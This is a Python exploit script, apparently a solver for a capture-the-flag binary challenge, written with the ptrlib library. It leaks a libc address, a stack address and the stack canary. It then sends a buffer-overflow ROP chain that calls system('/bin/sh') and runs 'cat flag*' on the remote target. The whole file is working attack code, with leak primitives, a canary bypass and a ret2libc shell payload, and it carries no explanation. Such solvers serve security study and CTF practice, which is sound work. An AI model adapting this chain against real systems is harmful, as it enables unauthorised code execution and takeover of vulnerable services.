from ptrlib import *

def new(type, age, name):
    sock.sendlineafter(">> ", "1")
    sock.sendlineafter(": ", str(type))
    sock.sendlineafter(": ", str(age))
    sock.sendlineafter(": ", name)
def get():
    sock.sendlineafter(">> ", "2")
    return sock.recvlineafter("Name: ")
def set(age, name):
    sock.sendlineafter(">> ", "3")
    sock.sendlineafter(": ", str(age))
    sock.sendlineafter(": ", name)

elf = ELF("./distfiles/chall")
libc = ELF("./distfiles/libc-2.31.so")
#sock = Process("./distfiles/chall")


HOST = os.getenv('HOST', 'localhost')
PORT = os.getenv('PORT', '9004')
sock = Socket(HOST, int(PORT))

# Leak libc address
new(2, 777, "tama")
set(elf.symbol("stdout"), "A" * 0x20)
libc_base = u64(get()) - libc.symbol('_IO_2_1_stdout_')
logger.info("libc = " + hex(libc_base))
libc.set_base(libc_base)

# Leak stack address
new(2, 777, "tama")
set(libc.symbol("environ"), "A" * 0x20)
addr_stack = u64(get())
logger.info("stack = " + hex(addr_stack))

# Leak canary
new(2, 777, "tama")
set(addr_stack - 0x120 + 1, "A" * 0x20)
canary = u64(get()[:7]) << 8
logger.info("canary = " + hex(canary))

# BOF to win!
rop_ret = 0x00403a34
rop_pop_rdi = 0x00403a33
payload  = b'B'*0x88
payload += p64(canary)
payload += p64(0xdeadbeefcafebabe)*3
payload += p64(rop_ret)
payload += p64(rop_pop_rdi)
payload += p64(addr_stack - 0xe0)
payload += p64(libc.symbol('system'))
payload += b'/bin/sh\0'
new(0, 777, payload)
sock.sendlineafter(">> ", "0")

# sock.interactive()
sock.sendline("cat flag*")
print(sock.recvuntil("}"))
